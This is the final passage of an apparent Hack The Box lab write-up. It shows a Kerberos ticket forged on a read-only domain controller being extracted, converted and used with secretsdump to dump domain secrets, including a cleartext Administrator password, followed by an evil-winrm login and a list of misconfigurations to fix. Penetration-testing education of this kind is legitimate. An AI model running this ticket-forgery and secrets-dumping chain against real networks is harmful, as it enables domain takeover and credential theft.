      doIFkjCCBY6gAwIBBaEDAgEWooIEfzCCBHthggR3MIIEc6ADAgEFoQ4bDEdBUkZJRUxELkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMZ2FyZmllbGQuaHRio4IENzCCBDOgAwIBEqEGAgQgNQAAooIEIgSCBB4dI+1wLwVHq8tHlYh/tDhc3h6Q0U5iwKTXzgdP68QB8w/6nohKac4yfV8fNlRXO5nCZTcb+ae//Tl887HXml2bt9Nw0WAgGs2oCerpXTGx2NdNDfd+OG8QysWwGl5ylyYaRKZiIYgY4AQsAP0LTt+pm34dn7A/8pGu68Hvhn3F1ZkwpyTHJrWg40qSecmhWln/PVhra9QnGTVj/sEPqsBRUB6PBybd6SVPVnyznd/CAQWrABDbRZBJ7fThBcEJarslMF0dVoPo7adU6e1ATxRNzWdeg6ZL91cKW/HWqaYed+J5p5KWZpt6kTObJ3vYefilo6d6rhSEIASv/O9YGoz05rO1fUqswobEriDNP/ZwVSBKIlAkPZVdc9t1KnpB0H13vESOs1KoF/l5WPL3cGwGiljXROWJX9fRWef7IHvnVDmvFiKrzN1Bxl5zHN+dHO9dt+iO4aZUBkeVg/pPC1pWBO5XDrtx39vSWdQHXJFIJqfqT0qoF2TYwHlo3GYRLb+dgldC64NGcmEjZw+9xUMa7sudpvDxi3LRsIhCcH3BpeHEkE/ivgx/JRRrIdmWQluw8Q3kdnKffeK9j6XznCdD+kIuU73gr+JDwTXagBbOOuNj6SkM0m8+EhEkBvvf35cX1qqOs7ntR0f9Z18Fe8wFrXv7NmWCA83b1gBu25xwusLdkTrKkwFNhlvVbS60tgiIb4DWadQbNYB6n6JbZOjzyD3diLKKEWGM8ZpP3anJ3tRAo1erkgBEZ0oVhrHQ0tjMTaczxjo/gU0D4UZBDh7ooDRRhHLahtU+950WWivTDg7+yGbkCp7NZx42bQgp1A3SnrDYtE5jxviMD+2EtTkYWSp/y2YhFOplK/qbvBsn31Ma1h+NR13ZgxaqkPgGab1Zbh3LQ6kVvmaBhJD9KtyFvZYOTv8kl9NT/FjrO/gN2ppRR5yAPWxBhoFB9ja7FYkT0ieiOwzlN4CCFd9OgGqM3xyhPcZPEhDon0jHP90bWCOvsaxhkSG5GlZheXbjv7KZV+yTeH+2FhTnb4Pz8TN2JpzZhFVdXRqhJrmb4IDI+brpYaZBY7zJxcGU6XSb9fz1xb+Rca4TxBwW2R030u4Hrnj5RThdbnlbDfw/bqrG5f8Idsu6Q08nv1+8mZXkFgNzUSUzsU30DH9p/4VDNVLNC7FZy4dTYUA/YHcl+1dCzUZ4+wixJSEDm1/rSLiohY7jMhr8xB6dVpa/RuVpATwXN3HHgB8jtxhVw5VNl8YfWAWpw/oivGgy3DZlf8JwGQ0dX41fhz9+/pzIc7T7vKfezzb2a1AAjgCs/QMAR+CAXgvXisTKyZ9dWV3aEfAYGTxM5GssiUXF8Stwa3nQEdicSrnU3JnkgX3xaD+T3xP8CBl5PajrYtZu0h1umzURo4H+MIH7oAMCAQCigfMEgfB9ge0wgeqggecwgeQwgeGgKzApoAMCARKhIgQgk2wSZ8WGcr72AefIbxEEG7RDjLaNZaKKD+5Kzj8+bZShDhsMR0FSRklFTEQuSFRCohowGKADAgEBoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAQOAAAKQRGA8yMDI2MTAzMDIzNTk0OVqlERgPMjAyNjEwMzAyMzU5NDlaphEYDzIwMjYxMDMxMDk1OTQ5WqcRGA8yMDI2MTEwNjIzNTk0OVqoDhsMR0FSRklFTEQuSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxnYXJmaWVsZC5odGI=


[*] Ticket written to ticket_2026_10_30_23_59_49_Administrator_to_krbtgt@GARFIELD.HTB.kirbi

```

We then smb into RODC01 and extract the kirbi file.

Then we convert it to ccache and export it to KRB5CCNAME

```
smb: \Users\l.wilson_adm\Documents\> ls                                                                                                                    
  .                                  DR        0  Fri Oct 30 19:59:49 2026                                                                                 
  ..                                 DR        0  Fri Oct 30 19:59:49 2026                                                                                 
  localadmin.b64                      A     2034  Fri Oct 30 18:32:21 2026                                                                                 
  localadmin_Administrator_to_RODC01$@GARFIELD.HTB.kirbi      A     1518  Fri Oct 30 18:31:41 2026                                                         
  localadmin_cifs_RODC01.garfield.htb.kirbi      A     1522  Fri Oct 30 18:31:41 2026                                                                      
  mimikatz.exe                        A  1355264  Fri Oct 30 17:35:42 2026                                                                                 
  My Music                        DHSrn        0  Fri Oct 30 17:33:12 2026                                                                                 
  My Pictures                     DHSrn        0  Fri Oct 30 17:33:12 2026                                                                                 
  My Videos                       DHSrn        0  Fri Oct 30 17:33:12 2026                                                                                 
  rodc01.kirbi                        A     1415  Fri Oct 30 18:09:36 2026                                                                                 
  rodc01_dc01.kirbi                   A     1396  Fri Oct 30 18:24:08 2026                                                                                 
  Rubeus.exe                          A   515584  Fri Oct 30 17:58:37 2026                                                                                 
  ticket_2026_10_30_23_59_49_Administrator_to_krbtgt@GARFIELD.HTB.kirbi      A     1430  Fri Oct 30 19:59:49 2026                                          
                                                                                                                                                           
                3266815 blocks of size 4096. 988015 blocks available                                                                                       
smb: \Users\l.wilson_adm\Documents\> get ticket_2026_10_30_23_59_49_Administrator_to_krbtgt@GARFIELD.HTB.kirbi                                             
getting file \Users\l.wilson_adm\Documents\ticket_2026_10_30_23_59_49_Administrator_to_krbtgt@GARFIELD.HTB.kirbi of size 1430 as ticket_2026_10_30_23_59_49
_Administrator_to_krbtgt@GARFIELD.HTB.kirbi (11.0 KiloBytes/sec) (average 11.0 KiloBytes/sec)                                                              
smb: \Users\l.wilson_adm\Documents\> exit                                                                                                                  
                                                                                                                                                           
┌──(kali㉿kali)-[~/Hacks/garfield]                                                                                                                         
└─$ impacket-ticketConverter ticket_2026_10_30_23_59_49_Administrator_to_krbtgt@GARFIELD.HTB.kirbi admin.ccache                                            
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies                                                                                 
                                                                                                                                                           
[*] converting kirbi to ccache...                                                                                                                          
[+] done                                                                                                                                                   
                                                                                                                                                           
┌──(kali㉿kali)-[~/Hacks/garfield]                                                                                                                         
└─$ klist admin.ccache                                                                                                                                     
Ticket cache: FILE:admin.ccache                                                                                                                            
Default principal: Administrator@GARFIELD.HTB                                                                                                              
                                                                                                                                                           
Valid starting       Expires              Service principal                                                                                                
10/30/2026 19:59:49  10/31/2026 05:59:49  krbtgt/garfield.htb@GARFIELD.HTB                                                                                 
        renew until 11/06/2026 18:59:49                                                                                                                    
                                                                                                                                                           
┌──(kali㉿kali)-[~/Hacks/garfield]                                                                                                                         
└─$ export KRB5CCNAME=~/Hacks/garfield/admin.ccache           
```

And dump the secrets

```
┌──(kali㉿kali)-[~/Hacks/garfield]
└─$ sudo ntpdate -u garfield.htb; impacket-secretsdump -k -no-pass  -dc-ip 10.129.77.197 DC01.garfield.htb   

...
[*] DefaultPassword 
GARFIELD\Administrator:lgoSWZnv0phWaNFu

```

We have our Administrator password. Now let's WinRM into the DC and get that root flag.

```
┌──(kali㉿kali)-[~/Hacks/garfield]
└─$ evil-winrm -u 'Administrator' -p 'lgoSWZnv0phWaNFu' -i 10.129.77.197
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls ..\Desktop\


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       10/30/2026   1:06 PM             34 root.txt

```

# Prevention

This host was full of misconfiguration that gave us access to the system in the end. 
* Writable access to SYSVOL\garfield.htb\scripts
* Writable access to l.wilson's scriptPath
* Allowing l.wilson_adm to add themselves to the RODC Administrators
* Allowing l.wilson_adm to change the "managedBy" for RODC01$


# Conclusion

In the end, we didn't really use the RBCD here. The main issues were that we were allowed to escalate the l.wilson_adm's role from a user to a local admin, and that l.wilson_adm could force the RODC to expose credentials. Once we extracted the Golden Ticket from the RODC, we were able to use it to extract the Admin password from the DC. 